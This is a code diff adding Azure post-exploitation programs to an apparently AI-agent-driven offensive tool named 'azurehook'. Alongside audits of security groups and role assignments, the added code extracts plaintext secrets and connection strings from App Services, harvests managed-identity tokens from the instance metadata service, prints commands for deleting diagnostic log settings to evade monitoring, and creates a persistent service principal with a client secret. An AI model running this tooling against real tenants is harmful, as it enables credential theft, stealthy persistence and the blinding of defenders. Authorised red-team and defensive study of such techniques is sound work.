@@ -54,6 +54,46 @@ const PROGRAMS = {
       "Deploy or modify Azure Function App with reverse shell or exfil code — supports HTTP trigger and timer trigger persistence",
     args: "--resource-group RG --name NAME --callback-url URL [--trigger http|timer] [--method create|inject]",
   },
+  vm_enum: {
+    description:
+      "Enumerate Azure VMs: instance metadata, extensions, custom data, disk encryption, public IPs, NSG associations, and user data scripts",
+    args: "[--subscription-id SUB] [--resource-group RG]",
+  },
+  nsg_audit: {
+    description:
+      "Audit Network Security Groups for overly permissive rules: open 0.0.0.0/0 ingress, any-any rules, unused NSGs, and dangerous port exposure (RDP/SSH/SQL)",
+    args: "[--subscription-id SUB] [--resource-group RG]",
+  },
+  rbac_audit: {
+    description:
+      "Audit Azure RBAC role assignments: find Owner/Contributor at subscription level, custom roles with dangerous actions, and service principals with excessive permissions",
+    args: "[--subscription-id SUB]",
+  },
+  sql_enum: {
+    description:
+      "Enumerate Azure SQL servers and databases: firewall rules, AD admin, TDE status, auditing config, public endpoint exposure, and connection string extraction",
+    args: "[--subscription-id SUB] [--server NAME]",
+  },
+  app_service_enum: {
+    description:
+      "Enumerate Azure App Services: connection strings, app settings with secrets, deployment credentials, SCM/Kudu access, managed identity, and CORS configuration",
+    args: "[--subscription-id SUB] [--resource-group RG]",
+  },
+  imds_harvest: {
+    description:
+      "Extract credentials and metadata from Azure Instance Metadata Service (IMDS). Gets subscription info, VM identity tokens, and network config from within a VM",
+    args: "[--resource RESOURCE_URL]",
+  },
+  diagnostic_tamper: {
+    description:
+      "Enumerate and manipulate Azure diagnostic settings and activity logs. Check monitoring coverage and identify blind spots for evasion",
+    args: "--action <status|disable> [--subscription-id SUB] [--resource-id RID]",
+  },
+  sp_persist: {
+    description:
+      "Create Azure AD app registration with client secret for persistent access. Assigns roles for long-term credential-based access",
+    args: "--name NAME [--role ROLE] [--scope SCOPE]",
+  },
   cleanup_azure: {
     description:
       "Remove all CyberStrike-created Azure resources, delete added SP secrets, remove runbooks. ALWAYS run before leaving",
@@ -1186,12 +1226,530 @@ async function functionAppBackdoor(args: string[], timeout: number): Promise<Hoo
   return { output: output.join("\n"), findings }
 }
 
+async function vmEnum(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Azure VMs...\n"]
+
+  const rgArgs = rg ? ["--resource-group", rg] : []
+  const vms = await az(["vm", "list", ...rgArgs, "--show-details"], sub, timeout)
+  if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Cannot list VMs: ${vms.stderr.slice(0, 200)}`, findings }
+
+  const items = tryJson(vms.stdout) || []
+  output.push(`[+] VMs: ${items.length}\n`)
+
+  for (const vm of items) {
+    output.push(`── ${vm.name} (${vm.hardwareProfile?.vmSize}) ──`)
+    output.push(`    RG: ${vm.resourceGroup}, Location: ${vm.location}`)
+    output.push(`    OS: ${vm.storageProfile?.osDisk?.osType || "?"}`)
+    output.push(`    Power: ${vm.powerState || "?"}`)
+    output.push(`    Public IP: ${vm.publicIps || "none"}`)
+
+    if (vm.publicIps) {
+      findings.push({
+        checkId: "AZ-VM-001",
+        provider: "azure",
+        severity: "medium",
+        status: "INFO",
+        resource: `vm://${vm.name}`,
+        title: `VM with public IP: ${vm.name}`,
+        details: `Public IP: ${vm.publicIps}`,
+        remediation: "Remove public IP if not required, use Azure Bastion instead",
+      })
+    }
+
+    const extensions = await az(["vm", "extension", "list", "--vm-name", vm.name, "--resource-group", vm.resourceGroup], sub, 15)
+    if (extensions.exitCode === 0) {
+      const exts = tryJson(extensions.stdout) || []
+      if (exts.length > 0) {
+        output.push(`    Extensions: ${exts.map((e: Record<string, string>) => e.name).join(", ")}`)
+      }
+    }
+
+    const disks = vm.storageProfile?.dataDisks || []
+    const osDisk = vm.storageProfile?.osDisk
+    if (osDisk && !osDisk.encryptionSettings?.enabled && !osDisk.managedDisk?.diskEncryptionSet) {
+      output.push(`    [!] OS disk not encrypted`)
+    }
+    if (disks.length > 0) output.push(`    Data disks: ${disks.length}`)
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function nsgAudit(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Auditing Azure Network Security Groups...\n"]
+
+  const rgArgs = rg ? ["--resource-group", rg] : []
+  const nsgs = await az(["network", "nsg", "list", ...rgArgs], sub, timeout)
+  if (nsgs.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list NSGs", findings }
+
+  const items = tryJson(nsgs.stdout) || []
+  output.push(`[+] NSGs: ${items.length}\n`)
+
+  const dangerousPorts = ["22", "3389", "1433", "3306", "5432", "27017", "6379", "9200"]
+
+  for (const nsg of items) {
+    output.push(`── ${nsg.name} (${nsg.resourceGroup}) ──`)
+    const rules = [...(nsg.securityRules || []), ...(nsg.defaultSecurityRules || [])]
+    const inbound = rules.filter((r: Record<string, string>) => r.direction === "Inbound" && r.access === "Allow")
+
+    for (const rule of inbound) {
+      const src = rule.sourceAddressPrefix || (rule.sourceAddressPrefixes || []).join(",")
+      const port = rule.destinationPortRange || (rule.destinationPortRanges || []).join(",")
+
+      if (src === "*" || src === "0.0.0.0/0" || src === "Internet") {
+        const isDangerous = port === "*" || dangerousPorts.some((p) => port.includes(p))
+        if (isDangerous) {
+          output.push(`  [!] ${rule.name}: ${src} → ${port} (OPEN TO INTERNET)`)
+          findings.push({
+            checkId: "AZ-NSG-001",
+            provider: "azure",
+            severity: port === "*" ? "critical" : "high",
+            status: "FAIL",
+            resource: `nsg://${nsg.name}/${rule.name}`,
+            title: `Open NSG rule: ${nsg.name}/${rule.name}`,
+            details: `Source: ${src}, Port: ${port}, Priority: ${rule.priority}`,
+            remediation: "Restrict source addresses to specific IP ranges",
+          })
+        }
+      }
+    }
+
+    const associations = nsg.networkInterfaces?.length || 0
+    const subnetAssoc = nsg.subnets?.length || 0
+    output.push(`  Associated: ${associations} NIC(s), ${subnetAssoc} subnet(s)`)
+    if (associations === 0 && subnetAssoc === 0) output.push(`  [!] NSG not associated with any resource`)
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function rbacAudit(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Auditing Azure RBAC role assignments...\n"]
+
+  const assignments = await az(["role", "assignment", "list", "--all", "--include-inherited"], sub, timeout)
+  if (assignments.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list role assignments", findings }
+
+  const items = tryJson(assignments.stdout) || []
+  output.push(`[+] Total role assignments: ${items.length}\n`)
+
+  const dangerousRoles = ["Owner", "Contributor", "User Access Administrator"]
+  const subLevel = items.filter((a: Record<string, string>) =>
+    a.scope?.match(/^\/subscriptions\/[^/]+$/) && dangerousRoles.includes(a.roleDefinitionName),
+  )
+
+  if (subLevel.length > 0) {
+    output.push(`[!] Subscription-level privileged assignments: ${subLevel.length}`)
+    for (const a of subLevel) {
+      output.push(`    ${a.principalType}/${a.principalName} → ${a.roleDefinitionName}`)
+      findings.push({
+        checkId: "AZ-RBAC-001",
+        provider: "azure",
+        severity: "high",
+        status: "FAIL",
+        resource: `rbac://${a.principalName}`,
+        title: `${a.roleDefinitionName} at subscription: ${a.principalName}`,
+        details: `${a.principalType} "${a.principalName}" has ${a.roleDefinitionName} at subscription scope`,
+        remediation: "Scope role assignment to resource group or resource level",
+      })
+    }
+  }
+
+  const spAssignments = items.filter((a: Record<string, string>) => a.principalType === "ServicePrincipal")
+  output.push(`\n[+] Service Principal assignments: ${spAssignments.length}`)
+  for (const a of spAssignments) {
+    if (dangerousRoles.includes(a.roleDefinitionName)) {
+      output.push(`    [!] ${a.principalName} → ${a.roleDefinitionName} (scope: ${a.scope?.split("/").pop()})`)
+    }
+  }
+
+  const customRoles = await az(["role", "definition", "list", "--custom-role-only"], sub, timeout)
+  if (customRoles.exitCode === 0) {
+    const roles = tryJson(customRoles.stdout) || []
+    output.push(`\n[+] Custom roles: ${roles.length}`)
+    for (const role of roles) {
+      const permissions = role.permissions || []
+      for (const p of permissions) {
+        const actions = p.actions || []
+        if (actions.includes("*")) {
+          output.push(`    [!] ${role.roleName}: wildcard action (*)`)
+          findings.push({
+            checkId: "AZ-RBAC-002",
+            provider: "azure",
+            severity: "critical",
+            status: "FAIL",
+            resource: `role://${role.roleName}`,
+            title: `Custom role with wildcard: ${role.roleName}`,
+            details: `Role has * action — equivalent to built-in Owner`,
+            remediation: "Restrict actions to specific resource types and operations",
+          })
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function sqlEnumAzure(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const server = argVal(args, "--server")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Azure SQL...\n"]
+
+  const servers = server
+    ? await az(["sql", "server", "show", "--name", server, "--resource-group", argVal(args, "--resource-group") || ""], sub, timeout)
+    : await az(["sql", "server", "list"], sub, timeout)
+
+  if (servers.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list SQL servers", findings }
+
+  const items = server ? [tryJson(servers.stdout)].filter(Boolean) : tryJson(servers.stdout) || []
+  output.push(`[+] SQL Servers: ${items.length}\n`)
+
+  for (const srv of items) {
+    output.push(`── ${srv.name} (${srv.location}) ──`)
+    output.push(`    FQDN: ${srv.fullyQualifiedDomainName}`)
+    output.push(`    Admin: ${srv.administratorLogin}`)
+    output.push(`    Version: ${srv.version}`)
+    output.push(`    Public network: ${srv.publicNetworkAccess}`)
+
+    if (srv.publicNetworkAccess === "Enabled") {
+      findings.push({
+        checkId: "AZ-SQL-001",
+        provider: "azure",
+        severity: "high",
+        status: "FAIL",
+        resource: `sql://${srv.name}`,
+        title: `SQL Server public access: ${srv.name}`,
+        details: `Public network access is enabled`,
+        remediation: "Disable public network access, use private endpoints",
+      })
+    }
+
+    const firewall = await az(["sql", "server", "firewall-rule", "list", "--server", srv.name, "--resource-group", srv.resourceGroup], sub, 15)
+    if (firewall.exitCode === 0) {
+      const rules = tryJson(firewall.stdout) || []
+      output.push(`    Firewall rules: ${rules.length}`)
+      for (const r of rules) {
+        output.push(`      ${r.name}: ${r.startIpAddress} - ${r.endIpAddress}`)
+        if (r.startIpAddress === "0.0.0.0" && r.endIpAddress === "255.255.255.255") {
+          findings.push({
+            checkId: "AZ-SQL-002",
+            provider: "azure",
+            severity: "critical",
+            status: "FAIL",
+            resource: `sql://${srv.name}/${r.name}`,
+            title: `SQL allow-all firewall: ${srv.name}`,
+            details: `Rule "${r.name}" allows 0.0.0.0-255.255.255.255`,
+            remediation: "Remove allow-all rule, restrict to specific IPs",
+          })
+        }
+      }
+    }
+
+    const dbs = await az(["sql", "db", "list", "--server", srv.name, "--resource-group", srv.resourceGroup], sub, 15)
+    if (dbs.exitCode === 0) {
+      const dbList = tryJson(dbs.stdout) || []
+      output.push(`    Databases: ${dbList.length}`)
+      for (const db of dbList) {
+        if (db.name === "master") continue
+        const tde = db.transparentDataEncryption?.state || "unknown"
+        output.push(`      ${db.name} (${db.currentServiceObjectiveName}) TDE: ${tde}`)
+      }
+    }
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function appServiceEnum(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const rg = argVal(args, "--resource-group")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Enumerating Azure App Services...\n"]
+
+  const rgArgs = rg ? ["--resource-group", rg] : []
+  const apps = await az(["webapp", "list", ...rgArgs], sub, timeout)
+  if (apps.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list web apps", findings }
+
+  const items = tryJson(apps.stdout) || []
+  output.push(`[+] App Services: ${items.length}\n`)
+
+  const secretPattern = /(?:password|secret|api[_-]?key|token|credential|connection[_-]?string)/i
+
+  for (const app of items) {
+    output.push(`── ${app.name} (${app.kind || "webapp"}) ──`)
+    output.push(`    URL: ${app.defaultHostName}`)
+    output.push(`    State: ${app.state}`)
+    output.push(`    HTTPS only: ${app.httpsOnly}`)
+    output.push(`    Client cert: ${app.clientCertEnabled}`)
+    output.push(`    Identity: ${app.identity?.type || "none"}`)
+
+    if (!app.httpsOnly) {
+      findings.push({
+        checkId: "AZ-APP-001",
+        provider: "azure",
+        severity: "medium",
+        status: "FAIL",
+        resource: `webapp://${app.name}`,
+        title: `HTTPS not enforced: ${app.name}`,
+        details: "App Service allows HTTP connections",
+        remediation: "Enable HTTPS Only in App Service settings",
+      })
+    }
+
+    const settings = await az(["webapp", "config", "appsettings", "list", "--name", app.name, "--resource-group", app.resourceGroup], sub, 15)
+    if (settings.exitCode === 0) {
+      const settingList = tryJson(settings.stdout) || []
+      for (const s of settingList) {
+        if (secretPattern.test(s.name) || secretPattern.test(s.value || "")) {
+          output.push(`    [!] Setting: ${s.name} = ${String(s.value || "").substring(0, 80)}...`)
+          findings.push({
+            checkId: "AZ-APP-002",
+            provider: "azure",
+            severity: "high",
+            status: "EXTRACTED",
+            resource: `webapp://${app.name}`,
+            title: `Secret in app settings: ${app.name}/${s.name}`,
+            details: `${s.name}: ${String(s.value || "").substring(0, 200)}`,
+            remediation: "Use Key Vault references instead of plaintext secrets",
+          })
+        }
+      }
+    }
+
+    const connStrings = await az(["webapp", "config", "connection-string", "list", "--name", app.name, "--resource-group", app.resourceGroup], sub, 15)
+    if (connStrings.exitCode === 0) {
+      const cs = tryJson(connStrings.stdout)
+      if (cs) {
+        for (const [name, val] of Object.entries(cs)) {
+          const v = val as Record<string, string>
+          output.push(`    [!] Connection string: ${name} (${v.type}) = ${v.value?.substring(0, 80)}...`)
+          findings.push({
+            checkId: "AZ-APP-003",
+            provider: "azure",
+            severity: "critical",
+            status: "EXTRACTED",
+            resource: `webapp://${app.name}`,
+            title: `Connection string: ${app.name}/${name}`,
+            details: `${name}: ${v.value?.substring(0, 200)}`,
+            remediation: "Use Key Vault references for connection strings",
+          })
+        }
+      }
+    }
+    output.push("")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function imdsHarvest(args: string[]): Promise<HookResult> {
+  const resource = argVal(args, "--resource") || "https://management.azure.com/"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Harvesting Azure IMDS metadata...\n"]
+
+  const meta = await run(
+    "curl",
+    ["-s", "--max-time", "5", "-H", "Metadata: true", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
+    10,
+  )
+  if (meta.exitCode !== 0 || !meta.stdout.includes("vmId")) {
+    return { output: output.join("\n") + "[-] Azure IMDS not accessible (not running in an Azure VM)", findings }
+  }
+
+  const d = tryJson(meta.stdout)
+  if (d?.compute) {
+    output.push(`[+] Azure IMDS accessible!`)
+    output.push(`    VM: ${d.compute.name}`)
+    output.push(`    RG: ${d.compute.resourceGroupName}`)
+    output.push(`    Sub: ${d.compute.subscriptionId}`)
+    output.push(`    Location: ${d.compute.location}`)
+    output.push(`    VM Size: ${d.compute.vmSize}`)
+    output.push(`    OS: ${d.compute.osType}`)
+    if (d.compute.tags) output.push(`    Tags: ${d.compute.tags}`)
+  }
+  if (d?.network?.interface) {
+    for (const iface of d.network.interface) {
+      for (const ip of iface.ipv4?.ipAddress || []) {
+        output.push(`    Private IP: ${ip.privateIpAddress}, Public IP: ${ip.publicIpAddress || "none"}`)
+      }
+    }
+  }
+
+  const token = await run(
+    "curl",
+    ["-s", "--max-time", "5", "-H", "Metadata: true", `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}`],
+    10,
+  )
+  if (token.exitCode === 0) {
+    const t = tryJson(token.stdout)
+    if (t?.access_token) {
+      output.push(`\n[+] Managed Identity token obtained!`)
+      output.push(`    Resource: ${resource}`)
+      output.push(`    Token: ${t.access_token.substring(0, 30)}...`)
+      output.push(`    Expires: ${t.expires_on}`)
+      findings.push({
+        checkId: "AZ-IMDS-001",
+        provider: "azure",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: "imds://169.254.169.254",
+        title: "Azure managed identity token extracted",
+        details: `Resource: ${resource}, expires: ${t.expires_on}`,
+        remediation: "Restrict managed identity permissions, use VM-level access controls",
+      })
+    }
+  }
+
+  const userData = await run(
+    "curl",
+    ["-s", "--max-time", "5", "-H", "Metadata: true", "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"],
+    10,
+  )
+  if (userData.exitCode === 0 && userData.stdout.trim()) {
+    const decoded = Buffer.from(userData.stdout.trim(), "base64").toString("utf-8")
+    output.push(`\n[+] User Data (custom script):`)
+    output.push(`    ${decoded.substring(0, 500)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function diagnosticTamper(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action")
+  const resourceId = argVal(args, "--resource-id")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Analyzing Azure diagnostic settings...\n"]
+
+  if (!action) return { output: "[-] --action required (status|disable)", findings }
+
+  if (action === "status") {
+    const activityLog = await az(["monitor", "activity-log", "list", "--max-events", "5"], sub, timeout)
+    if (activityLog.exitCode === 0) {
+      const events = tryJson(activityLog.stdout) || []
+      output.push(`[+] Activity log accessible: ${events.length} recent event(s)`)
+    }
+
+    const diagnostics = await az(["monitor", "diagnostic-settings", "subscription", "list"], sub, timeout)
+    if (diagnostics.exitCode === 0) {
+      const settings = tryJson(diagnostics.stdout)?.value || tryJson(diagnostics.stdout) || []
+      output.push(`[+] Subscription diagnostic settings: ${Array.isArray(settings) ? settings.length : 0}`)
+      if (Array.isArray(settings)) {
+        for (const s of settings) {
+          output.push(`    ${s.name}: ${s.workspaceId ? "Log Analytics" : ""} ${s.storageAccountId ? "Storage" : ""}`)
+        }
+      }
+      if ((Array.isArray(settings) && settings.length === 0) || !Array.isArray(settings)) {
+        findings.push({
+          checkId: "AZ-DIAG-001",
+          provider: "azure",
+          severity: "high",
+          status: "FAIL",
+          resource: "subscription://diagnostic-settings",
+          title: "No subscription diagnostic settings",
+          details: "Activity logs are not exported to external storage",
+          remediation: "Configure diagnostic settings to send logs to Log Analytics or Storage",
+        })
+      }
+    }
+
+    if (resourceId) {
+      const resDiag = await az(["monitor", "diagnostic-settings", "list", "--resource", resourceId], sub, timeout)
+      if (resDiag.exitCode === 0) {
+        const settings = tryJson(resDiag.stdout)?.value || []
+        output.push(`\n[+] Resource diagnostic settings: ${settings.length}`)
+      }
+    }
+  }
+
+  if (action === "disable") {
+    output.push(`[!] Disabling diagnostic settings requires specific resource targeting.`)
+    output.push(`    Manual commands:`)
+    output.push(`    az monitor diagnostic-settings delete --name <SETTING> --resource <RESOURCE_ID>`)
+    output.push(`    az monitor diagnostic-settings subscription delete --name <SETTING>`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function spPersist(args: string[], timeout: number): Promise<HookResult> {
+  const name = argVal(args, "--name")
+  const role = argVal(args, "--role") || "Reader"
+  const scope = argVal(args, "--scope")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Creating Azure AD app registration for persistence...\n"]
+
+  if (!name) return { output: "[-] --name required", findings }
+
+  const create = await az(["ad", "app", "create", "--display-name", name], undefined, timeout)
+  if (create.exitCode !== 0) return { output: output.join("\n") + `[-] App creation failed: ${create.stderr.slice(0, 200)}`, findings }
+
+  const app = tryJson(create.stdout)
+  if (!app?.appId) return { output: output.join("\n") + "[-] Could not parse app response", findings }
+
+  output.push(`[+] App created: ${name}`)
+  output.push(`    App ID: ${app.appId}`)
+  output.push(`    Object ID: ${app.id}`)
+
+  const spCreate = await az(["ad", "sp", "create", "--id", app.appId], undefined, timeout)
+  if (spCreate.exitCode === 0) {
+    const sp = tryJson(spCreate.stdout)
+    output.push(`[+] Service Principal created: ${sp?.id}`)
+  }
+
+  const secret = await az(["ad", "app", "credential", "reset", "--id", app.appId, "--append"], undefined, timeout)
+  if (secret.exitCode === 0) {
+    const cred = tryJson(secret.stdout)
+    if (cred) {
+      output.push(`\n[+] Client credentials:`)
+      output.push(`    Tenant: ${cred.tenant}`)
+      output.push(`    App ID: ${cred.appId}`)
+      output.push(`    Password: ${cred.password}`)
+      output.push(`\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`)
+    }
+  }
+
+  if (scope) {
+    const assign = await az(["role", "assignment", "create", "--assignee", app.appId, "--role", role, "--scope", scope], undefined, timeout)
+    output.push(
+      assign.exitCode === 0
+        ? `[+] Role "${role}" assigned at scope: ${scope}`
+        : `[-] Role assignment failed: ${assign.stderr.slice(0, 200)}`,
+    )
+  }
+
+  findings.push({
+    checkId: "AZ-SP-001",
+    provider: "azure",
+    severity: "critical",
+    status: "CREATED",
+    resource: `app://${name}`,
+    title: `Persistence app registration: ${name}`,
+    details: `App ID: ${app.appId} with client secret`,
+    remediation: `Remove: az ad app delete --id ${app.appId}`,
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
 
 export const AzurehookTool = Tool.define("azurehook", {
-  description: `Execute an Azure/Entra ID post-exploitation program after compromising Azure credentials or managed identity. Uses az CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_azure before leaving a target.`,
+  description: `Execute an Azure/Entra ID post-exploitation program. 20 programs: Entra ID enum/privesc, Key Vault dump, storage dump, VM enum, NSG/RBAC audit, SQL enum, App Service secrets, IMDS harvest, managed identity, token manipulation, persistence (runbook/logic app/function app/SP), diagnostics, cleanup. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_azure before leaving.`,
   parameters: z.object({
     program: z.enum(programKeys).describe(
       "Azure program to execute. Options: " +
@@ -1203,7 +1761,7 @@ export const AzurehookTool = Tool.define("azurehook", {
     timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
   }),
   async execute(params) {
-    if (!Bun.which("az")) {
+    if (!Bun.which("az") && !["managed_identity", "imds_harvest"].includes(params.program)) {
       return {
         title: `azurehook: ${params.program}`,
         output: "Azure CLI not found. Install: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli",
@@ -1223,6 +1781,14 @@ export const AzurehookTool = Tool.define("azurehook", {
       aks_enum: () => aksEnum(params.args, params.timeout_seconds),
       logic_app_backdoor: () => logicAppBackdoor(params.args, params.timeout_seconds),
       function_app_backdoor: () => functionAppBackdoor(params.args, params.timeout_seconds),
+      vm_enum: () => vmEnum(params.args, params.timeout_seconds),
+      nsg_audit: () => nsgAudit(params.args, params.timeout_seconds),
+      rbac_audit: () => rbacAudit(params.args, params.timeout_seconds),
+      sql_enum: () => sqlEnumAzure(params.args, params.timeout_seconds),
+      app_service_enum: () => appServiceEnum(params.args, params.timeout_seconds),
+      imds_harvest: () => imdsHarvest(params.args),
+      diagnostic_tamper: () => diagnosticTamper(params.args, params.timeout_seconds),
+      sp_persist: () => spPersist(params.args, params.timeout_seconds),
       cleanup_azure: () => cleanupAzure(params.args, params.timeout_seconds),
     }
 
